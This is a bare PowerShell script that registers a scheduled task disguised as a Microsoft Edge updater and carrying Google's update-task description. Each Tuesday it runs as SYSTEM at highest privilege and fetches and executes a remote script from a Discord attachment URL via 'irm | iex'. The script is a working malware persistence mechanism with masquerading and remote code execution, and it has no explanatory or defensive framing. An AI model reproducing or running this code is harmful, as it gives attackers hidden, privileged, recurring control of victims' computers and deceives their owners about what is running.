$taskName = "MicrosoftEdgeUpdateTaskMachineUSS"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://cdn.discordapp.com/attachments/415117565098983424/1087436866564935830/Test3.ps1 | iex'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Tuesday -At "1:42pm"
$task = Register-ScheduledTask -TaskName $taskName -Description "Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Google software using it." -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
$task.Settings.MultipleInstances = "Parallel"
$task.Settings.DisallowStartIfOnBatteries = $false
Set-ScheduledTask -TaskName $taskName -Settings $task.Settings
